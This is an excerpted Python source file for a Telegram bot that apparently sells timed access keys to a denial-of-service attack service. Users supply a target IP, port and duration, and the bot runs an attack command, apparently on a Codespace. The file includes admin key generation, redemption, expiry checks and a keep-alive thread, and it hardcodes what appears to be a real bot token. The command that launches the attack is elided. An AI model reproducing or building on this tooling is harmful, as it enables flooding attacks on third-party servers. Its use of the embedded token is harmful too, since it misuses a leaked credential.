...
CREATOR = "This File Is Made By @VIPMODXOWNER"
BotCode = "7636243069:AAFBrij7xlYhl16WNfBS9SOTRaYGcG2SeH0"
...
def verify_watermark():
    # Read the watermark text   # SCRIPT BY @VIPMODXOWNER
    ...
    # Read the stored hash  # SCRIPT BY @VIPMODXOWNER
    with open('attack.txt', 'r') as file:
        stored_hash = file.read().strip()

    if computed_hash != stored_hash:
        raise Exception("This File Is Made By @Hmm_Smokie.")
    print("This File Is Made By @Hmm_Smokie.\nThis File Is Made By @VIPMODXOWNER.")

verify()
verify_watermark()

# Keep-Alive Function # SCRIPT BY @VIPMODXOWNER
def keep_alive():
...
# Keep-Alive Thread # SCRIPT BY @VIPMODXOWNER
def start_keep_alive_thread():
    while True:
        keep_alive()
        time.sleep(300)  # Sleep for 5 minutes (300 seconds) before the next ping

# Start keep-alive in a separate thread # SCRIPT BY @VIPMODXOWNER
...
def save_users(users):
    with open(USERS_FILE, 'w') as f:
        json.dump(users, f)  # Save users as a JSON array # SCRIPT BY @VIPMODXOWNER
...
def add_keys_to_dict(key, duration):
    """Add generated key and its expiration to the dictionary.""" # SCRIPT BY @VIPMODXOWNER
...
async def run_attack_command_on_codespace(target_ip, target_port, duration, chat_id):
    ...
    try:
        ...
        output = stdout.decode().replace("", "@VIPMODXOWNER")  # Replace with your name
        error = stderr.decode()

        # Log output and errors for debugging # SCRIPT BY @VIPMODXOWNER
        if output:
...
# Attack command # SCRIPT BY @VIPMODXOWNER
...
def process_attack_command(message, chat_id):
    try:
        ...
        # Ensure we have 3 arguments # SCRIPT BY @VIPMODXOWNER
        if len(args) != 3:
        ...
        # Validate that the port is an integer # SCRIPT BY @VIPMODXOWNER
        try:
        ...
        # Validate that the duration is an integer # SCRIPT BY @VIPMODXOWNER
        try:
            duration = int(args[2])
        except ValueError:
        ...
        # Check if the port is blocked # SCRIPT BY @VIPMODXOWNER
        if target_port in blocked_ports:
            bot.send_message(chat_id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
            return

        # Run the attack command asynchronously # SCRIPT BY @VIPMODXOWNER
...
# /owner command handler # SCRIPT BY @VIPMODXOWNER
@bot.message_handler(commands=['owner'])
def send_owner_info(message):
    owner_message = "This Bot Has Been Developed By @VIPMODXOWNER"  
...
def send_welcome(message):
    ...
    # No user addition logic here; we only allow users who redeem keys # SCRIPT BY @VIPMODXOWNER
    welcome_message = (f"Welcome, {username}! To @SOULCRACKERS1\n\n"
                       f"Please redeem a key to access bot functionalities.\n"
                       f"Commands To use:\n/genkey (To generate key)\n/redeem (To redeem key)\n/remove (To remove user)\n/users (List of users)")

    # Create buttons for "My Account" and "Attack" # SCRIPT BY @VIPMODXOWNER
...
def genkey_command(message):
    ...
    # Check if the user is an admin # SCRIPT BY @VIPMODXOWNER
    if not is_admin(user_id):
        bot.send_message(chat_id, "*You are not authorized to generate keys.\nContact Owner: @VIPMODXOWNER*", parse_mode='Markdown')
        return
    ...
    if time_unit in ['hour', 'hours']:
        ...
        return
    # Generate a single key without expiration time # SCRIPT BY @VIPMODXOWNER
    key = generate_key()
...
def redeem_command(message):
    ...
    # Check if the key is valid and not already redeemed # SCRIPT BY @VIPMODXOWNER
    if key in keys and key not in redeemed_keys:
        duration = keys[key]  # Assuming this is a timedelta # SCRIPT BY @VIPMODXOWNER
        expiration_time = datetime.now() + duration
        ...
        if not found_user:
            new_user = {
                ...
                'plan': 'Plan Premium'  # Replace with actual plan if needed # SCRIPT BY @VIPMODXOWNER
            }
...
def attack_button_handler(message):
    ...
    if not found_user:
        bot.send_message(chat_id, "*You are not registered. Please redeem A key To Owner:- @VIPMODXOWNER*", parse_mode='Markdown')
        return

    # Check if the user's key is still valid # SCRIPT BY @VIPMODXOWNER
    valid_until = datetime.fromisoformat(found_user['valid_until'])
    if datetime.now() > valid_until:
        bot.send_message(chat_id, "*Your key has expired. Please redeem A key To Owner:- @VIPMODXOWNER.*", parse_mode='Markdown')
        return
...
def my_account(message):
    ...
    # Find the user in the list # SCRIPT BY @VIPMODXOWNER
    found_user = next((user for user in users if user['user_id'] == user_id), None)
    ...
    if found_user:
        ...
        if datetime.now() > datetime.fromisoformat(found_user['valid_until']):
            account_info = ("Your key has expired. Please redeem a new key.\n"
                            "Contact @VIPMODXOWNER for assistance.")
        else:
        ...
        account_info = "Please redeem A key To Owner:- @VIPMODXOWNER."
